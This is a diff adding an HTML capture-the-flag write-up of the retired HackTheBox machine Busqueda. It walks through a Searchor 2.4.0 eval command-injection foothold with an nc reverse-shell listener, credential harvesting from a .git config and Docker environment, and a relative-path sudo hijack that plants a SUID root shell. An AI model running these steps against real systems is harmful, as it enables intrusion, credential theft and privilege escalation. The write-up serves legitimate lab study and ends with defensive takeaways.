@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Busqueda &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Busqueda</h1>
+    <div class="meta">Target: <code>10.10.14.92</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Python</span><span class="tag">CMDInjection</span><span class="tag">git</span><span class="tag">gitea</span><span class="tag">credentialhunting</span><span class="tag">docker</span><span class="tag">sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#searchor-2-4-0-command-injection">Searchor 2.4.0 Command Injection</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#credentials-in-a-git-config">Credentials in a .git Config</a><a class="lvl3" href="#abusing-system-checkup-py">Abusing system-checkup.py</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Busqueda is an easy Linux box that flows from a command-injection RCE in a Python web app to a tidy <code>sudo</code> privilege escalation by way of credential reuse and a Docker-aware helper script. The foothold is <strong>CVE-2023-43364</strong> in Searchor 2.4.0; the root comes from a sudo-runnable script that I can both <em>inspect</em> (after looting Gitea) and <em>hijack</em> via a relative-path bug.</p>
+<h2 id="recon">Recon</h2>
+<p>The site redirects to a vhost, added to hosts, and presents a Flask app branded <strong>Searchor 2.4.0</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="searchor-2-4-0-command-injection">Searchor 2.4.0 Command Injection</h3>
+<blockquote>
+<p><strong>Why it's vulnerable:</strong> Searchor built its search URL by passing user input into Python's <code>eval()</code>. Anything you type is evaluated as Python, so a crafted query breaks out into <code>os.system(...)</code>. User-controlled <code>eval</code> is one of the most direct RCE primitives there is.</p>
+</blockquote>
+<pre><code class="language-sh">python3 searchor-2_4_0_RCE.py searcher.htb 10.10.14.92 53
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+whoami
+svc
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="credentials-in-a-git-config">Credentials in a .git Config</h3>
+<p>The web root held a <code>.git</code> directory. Git remotes often embed credentials, and this one did:</p>
+<pre><code class="language-sh">cat /var/www/app/.git/config
+[remote &quot;origin&quot;]
+    url = http://cody:‹redacted›@gitea.searcher.htb/cody/Searcher_site.git
+</code></pre>
+<blockquote>
+<p><strong>Why this is a privesc lead, not just a Gitea login:</strong> the password was useful far beyond Gitea. I tested it against <code>sudo</code> for the <code>svc</code> account, and password reuse paid off:</p>
+</blockquote>
+<pre><code class="language-sh">sudo -l
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+</code></pre>
+<h3 id="abusing-system-checkup-py">Abusing system-checkup.py</h3>
+<p>I couldn't read the script's source, but running it with a bogus argument leaked its usage:</p>
+<pre><code>docker-ps      : List running docker containers
+docker-inspect : Inspect a certain docker container
+full-checkup   : Run a full system checkup
+</code></pre>
+<p><code>docker-inspect</code> passes a format string to <code>docker inspect</code>, so I dumped a container's full config as JSON and found the Gitea DB credentials in its environment:</p>
+<pre><code class="language-sh">sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .
+&quot;GITEA__database__PASSWD=‹redacted›&quot;
+</code></pre>
+<p>That password unlocked the Gitea <strong>administrator</strong> account (reuse again), which gave me read access to the <code>system-checkup.py</code> source. There the <code>full-checkup</code> action revealed the real flaw:</p>
+<pre><code class="language-python">elif action == 'full-checkup':
+    arg_list = ['./full-checkup.sh']   # relative path!
+</code></pre>
+<blockquote>
+<p><strong>The bug:</strong> the script calls <code>./full-checkup.sh</code> by <em>relative</em> path. Since I control the working directory when I invoke it, I can drop my own <code>full-checkup.sh</code> in <code>/tmp</code> and run the sudo command from there, root then executes my script.</p>
+</blockquote>
+<pre><code class="language-sh">echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' &gt; /tmp/full-checkup.sh
+cd /tmp &amp;&amp; sudo python3 /opt/scripts/system-checkup.py full-checkup
+</code></pre>
+<h2 id="root">Root</h2>
+<p>The SUID <code>rootbash</code> drops a root shell:</p>
+<pre><code class="language-sh">/tmp/rootbash -p
+rootbash-5.1# whoami
+root
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>eval()</code> on user input = RCE.</strong> Searchor 2.4.0 is a clean example.</li>
+<li><strong>Password reuse is the connective tissue here.</strong> One looted git password unlocked <code>sudo</code>, Gitea admin, and ultimately the script source.</li>
+<li><strong>Relative paths in root scripts are hijackable.</strong> Control the CWD, plant the named file, and the privileged process runs your code.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
